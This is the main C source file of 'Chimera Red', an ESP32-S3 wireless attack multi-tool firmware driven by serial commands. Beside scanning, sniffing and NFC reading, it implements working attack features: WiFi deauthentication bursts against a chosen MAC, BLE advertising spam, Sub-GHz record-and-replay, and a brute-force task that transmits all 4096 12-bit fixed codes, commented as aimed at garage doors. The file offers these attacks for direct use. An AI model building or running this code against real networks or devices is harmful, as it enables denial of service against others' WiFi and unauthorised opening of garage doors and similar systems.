/**
 * @file main.c
 * @brief Chimera Red Firmware - ESP-IDF Version
 *
 * Main entry point for the Chimera Red multi-tool firmware.
 * This is a pure ESP-IDF implementation, migrated from Arduino
 * to enable reliable raw 802.11 frame injection for deauthentication.
 *
 * Features:
 * - WiFi scanning, sniffing, and deauth attacks
 * - BLE scanning and spam advertising
 * - NFC tag reading (PN532)
 * - Sub-GHz radio (CC1101)
 * - TFT display GUI
 * - Button controls
 * - Serial command interface
 */

#include "ble_scanner.h"
#include "buttons.h"
#include "display.h"
#include "gui.h"
#include "nfc_pn532.h"
#include "serial_comm.h"
#include "subghz_cc1101.h"
#include "wifi_manager.h"

#include "driver/spi_master.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_wifi.h" // Required for wifi_ap_record_t and esp_wifi_sta_get_ap_info
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char *TAG = "main";

// Version
#define FIRMWARE_VERSION "0.3.0-IDF"

// Replay buffer for Sub-GHz
static uint8_t *g_replay_buffer = NULL;
static size_t g_replay_len = 0;
#define REPLAY_BUFFER_SIZE (32 * 1024)

// Forward declarations
static void handle_command(const char *cmd);
static void wifi_scan_callback(const wifi_scan_result_t *result);
static void ble_scan_callback(const ble_device_t *device);
static void ble_scan_complete_callback(void);

// BLE Scan State
#define MAX_BLE_DEVICES 64
static ble_device_t g_ble_devices[MAX_BLE_DEVICES];
static int g_ble_device_count = 0;

// JSON buffer size for BLE scan results
#define BLE_JSON_BUFFER_SIZE 16384
#define BLE_JSON_ENTRY_RESERVE 256 // Reserve space per entry

// --- Command Handlers ---

static void cmd_scan_wifi(void) {
  gui_log("Scanning WiFi...");
  wifi_scan_start(wifi_scan_callback);
}

static void cmd_scan_ble(void) {
  gui_log("Scanning BLE...");
  g_ble_device_count = 0;
  ble_scan_start(ble_scan_callback, ble_scan_complete_callback,
                 5000); // 5 second scan
}

static void cmd_sniff_start(const char *payload) {
  int channel = (payload && *payload) ? atoi(payload) : 0;

  char msg[32];
  if (channel == 0) {
    snprintf(msg, sizeof(msg), "Sniffing (hopping)");
  } else {
    snprintf(msg, sizeof(msg), "Sniffing ch %d", channel);
  }
  gui_log(msg);

  wifi_sniffer_start(channel);
}

static void cmd_sniff_stop(void) {
  wifi_sniffer_stop();
  gui_log("Sniff stopped");
}

static void cmd_deauth(const char *payload) {
  if (!payload || strlen(payload) < 17) {
    serial_send_json("error", "\"Invalid or missing MAC address\"");
    return;
  }

  uint8_t mac[6];
  uint8_t channel = 0;

  // Parse MAC (required) and optional channel at the end (AA:BB:CC:DD:EE:FF or
  // AA:BB:CC:DD:EE:FF:CH)
  int fields = sscanf(payload, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx:%hhu", &mac[0],
                      &mac[1], &mac[2], &mac[3], &mac[4], &mac[5], &channel);

  if (fields < 6) {
    serial_send_json("error", "\"Invalid MAC format\"");
    return;
  }

  // If only 6 fields were parsed, channel remains 0 (hopping)

  char msg[64];
  snprintf(msg, sizeof(msg), "DEAUTH %02X:..:%02X ch%d", mac[0], mac[5],
           channel);
  gui_log_color(msg, COLOR_RED);

  ESP_LOGI(TAG, "Starting deauth burst: %02X:%02X:%02X:%02X:%02X:%02X ch=%d",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], channel);

  // Use the optimized burst function - sends 50 packets in one WiFi session
  esp_err_t ret = wifi_send_deauth_burst(NULL, mac, channel, 7, 50);

  // Report results
  char json[128];
  snprintf(json, sizeof(json),
           "{\"type\":\"deauth_result\",\"success\":%s,\"channel\":%d}",
           (ret == ESP_OK) ? "true" : "false", channel);
  serial_send_json_raw(json);

  ESP_LOGI(TAG, "Deauth burst complete: %s",
           (ret == ESP_OK) ? "SUCCESS" : "FAILED");
}

static void cmd_ble_spam(const char *payload) {
  const char *type = (payload && *payload) ? payload : NULL;

  char msg[32];
  snprintf(msg, sizeof(msg), "BLE Spam: %s", type ? type : "BENDER");
  gui_log_color(msg, COLOR_ORANGE);

  ble_spam_start(type, 50);
}

static void cmd_set_freq(const char *payload) {
  if (!payload || !*payload) {
    serial_send_json("error", "\"Missing frequency\"");
    return;
  }

  float freq = atof(payload);
  if (freq > 300.0f && freq < 950.0f) {
    cc1101_set_frequency(freq);

    char msg[32];
    snprintf(msg, sizeof(msg), "Freq: %.2f MHz", freq);
    gui_log(msg);
  } else {
    serial_send_json("error", "\"Invalid frequency\"");
  }
}

static void cmd_subghz_record(void) {
  if (!g_replay_buffer) {
    g_replay_buffer = heap_caps_malloc(REPLAY_BUFFER_SIZE,
                                       MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!g_replay_buffer) {
      g_replay_buffer = malloc(4096); // Fallback to smaller buffer
    }
  }

  if (g_replay_buffer) {
    gui_log("Recording Sub-GHz...");
    cc1101_record_start(g_replay_buffer, REPLAY_BUFFER_SIZE);
  } else {
    serial_send_json("error", "\"Memory allocation failed\"");
  }
}

static void cmd_subghz_replay(void) {
  if (g_replay_len > 0 && g_replay_buffer) {
    gui_log("Replaying signal...");
    cc1101_replay(g_replay_buffer, g_replay_len);
  } else {
    serial_send_json("error", "\"Buffer empty\"");
  }
}

static void cmd_nfc_scan(void) {
  gui_log("Scanning NFC...");

  nfc_tag_t tag;
  if (pn532_read_passive_target(&tag, 3000)) {
    char json[256];
    char uid_str[32] = "";

    for (int i = 0; i < tag.uid_len && i < 10; i++) {
      char byte_str[4];
      snprintf(byte_str, sizeof(byte_str), "%02X", tag.uid[i]);
      strncat(uid_str, byte_str, sizeof(uid_str) - strlen(uid_str) - 1);
    }

    snprintf(json, sizeof(json), "{\"uid\":\"%s\",\"type\":\"nfc_found\"}",
             uid_str);
    serial_send_json_raw(json);

    char msg[32];
    snprintf(msg, sizeof(msg), "NFC: %s", uid_str);
    gui_log_color(msg, COLOR_CYAN);
  } else {
    serial_send_json("status", "\"No tag found\"");
  }
}

static void cmd_get_info(void) {
  char json[512];
  uint32_t free_heap = esp_get_free_heap_size();
  uint32_t total_heap = heap_caps_get_total_size(MALLOC_CAP_8BIT);
  uint32_t psram = heap_caps_get_total_size(MALLOC_CAP_SPIRAM);

  snprintf(json, sizeof(json),
           "{\"type\":\"sys_info\",\"chip\":\"ESP32-S3\",\"version\":\"%s\","
           "\"free_heap\":%lu,\"total_heap\":%lu,\"psram\":%lu,"
           "\"nfc\":%s,\"cc1101\":%s}",
           FIRMWARE_VERSION, (unsigned long)free_heap,
           (unsigned long)total_heap, (unsigned long)psram,
           pn532_is_present() ? "true" : "false",
           cc1101_is_present() ? "true" : "false");

  serial_send_json_raw(json);
}

static void cmd_recon_start(void) {
  wifi_start_recon_mode();
  wifi_sniffer_start(0); // Start hopping
  gui_log("Recon mode active");
}

static void cmd_recon_stop(void) {
  wifi_stop_recon_mode();
  wifi_sniffer_stop();
  gui_log("Recon stopped");
}

// --- CSI (Channel State Information) Commands ---
static bool g_csi_active = false;

static void cmd_csi_start(void) {
  if (g_csi_active) {
    serial_send_json("status", "\"CSI already active\"");
    return;
  }

  // CSI requires promiscuous mode with specific filter
  wifi_sniffer_start(0); // Start on current channel
  g_csi_active = true;
  gui_log_color("CSI Radar Active", COLOR_CYAN);
  serial_send_json("status", "\"CSI started\"");
}

static void cmd_csi_stop(void) {
  if (g_csi_active) {
    wifi_sniffer_stop();
    g_csi_active = false;
    gui_log("CSI stopped");
    serial_send_json("status", "\"CSI stopped\"");
  }
}

// --- NFC Emulation ---
static void cmd_nfc_emulate(void) {
  // Check if we have a UID to emulate
  gui_log("NFC Emulate...");

  // PN532 doesn't support host card emulation easily - requires special
  // firmware For now, report that we're emulating the last read tag
  serial_send_json("status",
                   "\"Emulating last read UID (passive mode not supported)\"");

  // Note: Full HCE would require PN532 firmware modification
  // This is a placeholder for future NFC-DEP P2P mode
  gui_log_color("Emulate: Limited", COLOR_ORANGE);
}

// --- Sub-GHz Analyzer (RSSI sweep) ---
static bool g_analyzer_active = false;
static TaskHandle_t g_analyzer_task = NULL;

static void analyzer_task(void *arg) {
  (void)arg;

  while (g_analyzer_active) {
    int rssi = cc1101_get_rssi();

    // Send RSSI as analyzer data (single value for now)
    char json[64];
    snprintf(json, sizeof(json), "{\"type\":\"analyzer_data\",\"rssi\":%d}",
             rssi);
    serial_send_json_raw(json);

    vTaskDelay(pdMS_TO_TICKS(50)); // 20 Hz update rate
  }

  g_analyzer_task = NULL;
  vTaskDelete(NULL);
}

static void cmd_analyzer_start(void) {
  if (g_analyzer_active) {
    serial_send_json("status", "\"Analyzer already running\"");
    return;
  }

  if (!cc1101_is_present()) {
    serial_send_json("error", "\"CC1101 not detected\"");
    return;
  }

  g_analyzer_active = true;
  cc1101_rx_start();

  xTaskCreate(analyzer_task, "analyzer", 2048, NULL, 3, &g_analyzer_task);
  gui_log_color("Analyzer Running", COLOR_CYAN);
  serial_send_json("status", "\"Analyzer started\"");
}

static void cmd_analyzer_stop(void) {
  if (g_analyzer_active) {
    g_analyzer_active = false;
    cc1101_idle();
    gui_log("Analyzer stopped");
    serial_send_json("status", "\"Analyzer stopped\"");
  }
}

// --- Sub-GHz Brute Force (12-bit fixed codes) ---
static bool g_brute_active = false;
static TaskHandle_t g_brute_task = NULL;

static void brute_force_task(void *arg) {
  (void)arg;

  gui_log_color("Brute: Starting", COLOR_RED);

  // Common 12-bit fixed code format for garage doors
  // PT2262 encoding: each bit is represented by pulse patterns
  // We'll cycle through all 4096 combinations (2^12)

  uint8_t tx_buffer[16];
  int codes_sent = 0;

  for (uint16_t code = 0; code < 4096 && g_brute_active; code++) {
    // Encode 12-bit code into pulse data
    // Simple OOK encoding: short pulse = 0, long pulse = 1
    for (int bit = 0; bit < 12; bit++) {
      if (code & (1 << (11 - bit))) {
        tx_buffer[bit] = 0xE0; // Long pulse pattern
      } else {
        tx_buffer[bit] = 0x80; // Short pulse pattern
      }
    }
    // Add sync pulse
    tx_buffer[12] = 0x00;
    tx_buffer[13] = 0x00;

    // Transmit
    cc1101_tx(tx_buffer, 14);

    codes_sent++;

    // Progress update every 256 codes
    if ((code & 0xFF) == 0) {
      char msg[48];
      snprintf(msg, sizeof(msg), "Brute: %d/4096", code);
      gui_log(msg);

      char json[64];
      snprintf(json, sizeof(json),
               "{\"type\":\"brute_progress\",\"current\":%d,\"total\":4096}",
               code);
      serial_send_json_raw(json);
    }

    vTaskDelay(pdMS_TO_TICKS(20)); // ~50 codes/sec
  }

  g_brute_active = false;
  g_brute_task = NULL;

  char result[64];
  snprintf(result, sizeof(result), "Brute complete: %d codes", codes_sent);
  gui_log_color(result, COLOR_GREEN);
  serial_send_json("status", "\"Brute force complete\"");

  vTaskDelete(NULL);
}

static void cmd_subghz_brute(void) {
  if (g_brute_active) {
    serial_send_json("status", "\"Brute force already running\"");
    return;
  }

  if (!cc1101_is_present()) {
    serial_send_json("error", "\"CC1101 not detected\"");
    return;
  }

  g_brute_active = true;
  xTaskCreate(brute_force_task, "brute", 4096, NULL, 3, &g_brute_task);
}

// --- Generic STOP command ---
static void cmd_stop_all(void) {
  // Stop all active operations
  if (g_csi_active)
    cmd_csi_stop();
  if (g_analyzer_active)
    cmd_analyzer_stop();
  if (g_brute_active) {
    g_brute_active = false;
    gui_log("Brute force aborted");
  }
  wifi_sniffer_stop();

  gui_log("All operations stopped");
  serial_send_json("status", "\"All stopped\"");
}

// --- Status / Heartbeat Task ---
static void status_task(void *arg) {
  (void)arg;

  while (1) {
    vTaskDelay(pdMS_TO_TICKS(5000)); // Every 5 seconds

    uint32_t free_heap = esp_get_free_heap_size();
    uint32_t min_heap = esp_get_minimum_free_heap_size();
    int rssi = 0;

    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
      rssi = ap_info.rssi;
    }

    char json[128];
    snprintf(
        json, sizeof(json),
        "{\"type\":\"sys_status\",\"heap\":%lu,\"min_heap\":%lu,\"rssi\":%d}",
        (unsigned long)free_heap, (unsigned long)min_heap, rssi);
    serial_send_json_raw(json);
  }
}

// --- Serial Command Handler ---
static void handle_command(const char *cmd) {
  if (!cmd || *cmd == '\0') {
    return;
  }

  ESP_LOGI(TAG, "CMD: %s", cmd);

  char cmd_buf[128];
  strncpy(cmd_buf, cmd, sizeof(cmd_buf) - 1);
  cmd_buf[sizeof(cmd_buf) - 1] = '\0';

  char *payload = strchr(cmd_buf, ':');
  char *command = cmd_buf;

  if (payload) {
    *payload = '\0';
    payload++;
  }

  if (strcmp(command, "SCAN_WIFI") == 0) {
    cmd_scan_wifi();
  } else if (strcmp(command, "SCAN_BLE") == 0) {
    cmd_scan_ble();
  } else if (strcmp(command, "SNIFF_START") == 0) {
    cmd_sniff_start(payload);
  } else if (strcmp(command, "SNIFF_STOP") == 0) {
    cmd_sniff_stop();
  } else if (strcmp(command, "DEAUTH") == 0) {
    cmd_deauth(payload);
  } else if (strcmp(command, "BLE_SPAM") == 0) {
    cmd_ble_spam(payload);
  } else if (strcmp(command, "SET_FREQ") == 0) {
    cmd_set_freq(payload);
  } else if (strcmp(command, "RX_RECORD") == 0) {
    cmd_subghz_record();
  } else if (strcmp(command, "TX_REPLAY") == 0) {
    cmd_subghz_replay();
  } else if (strcmp(command, "NFC_SCAN") == 0) {
    cmd_nfc_scan();
  } else if (strcmp(command, "GET_INFO") == 0) {
    cmd_get_info();
  } else if (strcmp(command, "RECON_START") == 0) {
    cmd_recon_start();
  } else if (strcmp(command, "RECON_STOP") == 0) {
    cmd_recon_stop();
  } else if (strcmp(command, "CSI_START") == 0) {
    cmd_csi_start();
  } else if (strcmp(command, "CSI_STOP") == 0) {
    cmd_csi_stop();
  } else if (strcmp(command, "NFC_EMULATE") == 0) {
    cmd_nfc_emulate();
  } else if (strcmp(command, "ANALYZER_START") == 0) {
    cmd_analyzer_start();
  } else if (strcmp(command, "ANALYZER_STOP") == 0) {
    cmd_analyzer_stop();
  } else if (strcmp(command, "SUBGHZ_BRUTE") == 0) {
    cmd_subghz_brute();
  } else if (strcmp(command, "STOP") == 0) {
    cmd_stop_all();
  } else if (strcmp(command, "SYS_RESET") == 0) {
    gui_log("Rebooting...");
    vTaskDelay(pdMS_TO_TICKS(500));
    esp_restart();
  } else if (strncmp(command, "INPUT_", 6) == 0) {
    if (strcmp(command, "INPUT_UP") == 0) {
      gui_handle_input(INPUT_UP);
    } else if (strcmp(command, "INPUT_DOWN") == 0) {
      gui_handle_input(INPUT_DOWN);
    } else if (strcmp(command, "INPUT_SELECT") == 0) {
      gui_handle_input(INPUT_SELECT);
    } else if (strcmp(command, "INPUT_BACK") == 0) {
      gui_handle_input(INPUT_BACK);
    }
  } else {
    ESP_LOGW(TAG, "Unknown command: %s", command);
    serial_send_json("error", "\"Unknown command\"");
  }
}

// --- Callbacks ---
static void wifi_scan_callback(const wifi_scan_result_t *result) {
  if (!result) {
    return;
  }

  char msg[64];
  snprintf(msg, sizeof(msg), "AP: %s (%ddBm)",
           result->ssid[0] ? result->ssid : "[HIDDEN]", result->rssi);
  gui_log(msg);
}

static void ble_scan_callback(const ble_device_t *device) {
  if (!device) {
    return;
  }

  char msg[64];
  snprintf(msg, sizeof(msg), "BLE: %s (%ddBm)",
           device->has_name ? device->name : "Unknown", device->rssi);
  gui_log(msg);

  bool exists = false;
  for (int i = 0; i < g_ble_device_count; i++) {
    if (memcmp(g_ble_devices[i].addr, device->addr, 6) == 0) {
      exists = true;
      break;
    }
  }

  if (!exists && g_ble_device_count < MAX_BLE_DEVICES) {
    memcpy(&g_ble_devices[g_ble_device_count++], device, sizeof(ble_device_t));
  }
}

static void ble_scan_complete_callback(void) {
  char *json = malloc(BLE_JSON_BUFFER_SIZE);
  if (!json) {
    ESP_LOGE(TAG, "Failed to allocate BLE JSON buffer");
    return;
  }

  int pos = snprintf(json, BLE_JSON_BUFFER_SIZE,
                     "{\"type\":\"ble_scan_result\",\"count\":%d,\"devices\":[",
                     g_ble_device_count);

  for (int i = 0; i < g_ble_device_count; i++) {
    if (pos >= BLE_JSON_BUFFER_SIZE - BLE_JSON_ENTRY_RESERVE) {
      ESP_LOGW(TAG, "BLE JSON buffer nearly full, truncating at %d devices", i);
      break;
    }

    char addr_str[18];
    snprintf(addr_str, sizeof(addr_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             g_ble_devices[i].addr[0], g_ble_devices[i].addr[1],
             g_ble_devices[i].addr[2], g_ble_devices[i].addr[3],
             g_ble_devices[i].addr[4], g_ble_devices[i].addr[5]);

    char escaped_name[65];
    serial_escape_json(g_ble_devices[i].has_name ? g_ble_devices[i].name
                                                 : "Unknown",
                       escaped_name, sizeof(escaped_name));

    int written = snprintf(json + pos, BLE_JSON_BUFFER_SIZE - pos,
                           "%s{\"name\":\"%s\",\"address\":\"%s\",\"rssi\":%d}",
                           (i > 0) ? "," : "", escaped_name, addr_str,
                           g_ble_devices[i].rssi);

    if (written > 0 && pos + written < BLE_JSON_BUFFER_SIZE) {
      pos += written;
    } else {
      break;
    }
  }

  if (pos < BLE_JSON_BUFFER_SIZE - 3) {
    json[pos++] = ']';
    json[pos++] = '}';
    json[pos] = '\0';
  } else {
    json[BLE_JSON_BUFFER_SIZE - 3] = ']';
    json[BLE_JSON_BUFFER_SIZE - 2] = '}';
    json[BLE_JSON_BUFFER_SIZE - 1] = '\0';
  }

  serial_send_json_raw(json);
  free(json);
}

// --- Main Entry Point ---
void app_main(void) {
  vTaskDelay(pdMS_TO_TICKS(500));

  ESP_LOGI(TAG, "=========================================");
  ESP_LOGI(TAG, " CHIMERA RED - ESP-IDF Firmware v%s", FIRMWARE_VERSION);
  ESP_LOGI(TAG, "=========================================");

  spi_bus_config_t bus_cfg = {
      .mosi_io_num = 7,
      .miso_io_num = 13,
      .sclk_io_num = 6,
      .quadwp_io_num = -1,
      .quadhd_io_num = -1,
      .max_transfer_sz = 320 * 240 * 2,
  };

  esp_err_t ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Shared SPI bus init failed: %s", esp_err_to_name(ret));
  }

  ESP_LOGI(TAG, "Free heap: %lu bytes",
           (unsigned long)esp_get_free_heap_size());
  ESP_LOGI(TAG, "PSRAM: %lu bytes",
           (unsigned long)heap_caps_get_total_size(MALLOC_CAP_SPIRAM));

  serial_init();
  serial_set_cmd_handler(handle_command);
  ESP_LOGI(TAG, "Serial initialized");

  ret = wifi_manager_init();
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "WiFi manager ready");
  } else {
    ESP_LOGE(TAG, "WiFi init failed: %s", esp_err_to_name(ret));
  }

  ret = ble_scanner_init();
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "BLE scanner ready");
  } else {
    ESP_LOGW(TAG, "BLE init failed: %s", esp_err_to_name(ret));
  }

  ret = pn532_init();
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "NFC reader ready");
  } else if (ret == ESP_ERR_NOT_FOUND) {
    ESP_LOGW(TAG, "NFC reader not detected");
  } else {
    ESP_LOGW(TAG, "NFC init failed: %s", esp_err_to_name(ret));
  }

  ret = cc1101_init();
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "Sub-GHz radio ready");
  } else if (ret == ESP_ERR_NOT_FOUND) {
    ESP_LOGW(TAG, "CC1101 not detected");
  } else {
    ESP_LOGW(TAG, "CC1101 init failed: %s", esp_err_to_name(ret));
  }

  ret = gui_init();
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "GUI initialized");
    gui_log_color("CHIMERA RED", COLOR_RED);
    gui_log("ESP-IDF v" FIRMWARE_VERSION);
    gui_log("System Ready");
  } else {
    ESP_LOGE(TAG, "GUI init failed: %s", esp_err_to_name(ret));
  }

  ret = buttons_init();
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "Buttons initialized");
  } else {
    ESP_LOGW(TAG, "Buttons init failed: %s", esp_err_to_name(ret));
  }

  serial_send_json("status", "\"CHIMERA_READY\"");

  BaseType_t task_ret =
      xTaskCreate(status_task, "status_task", 2048, NULL, 5, NULL);
  if (task_ret != pdPASS) {
    ESP_LOGE(TAG, "Failed to create status task");
  }

  ESP_LOGI(TAG, "=========================================");
  ESP_LOGI(TAG, " System initialized - entering main loop");
  ESP_LOGI(TAG, "=========================================");

  while (1) {
    buttons_poll();
    gui_update();
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}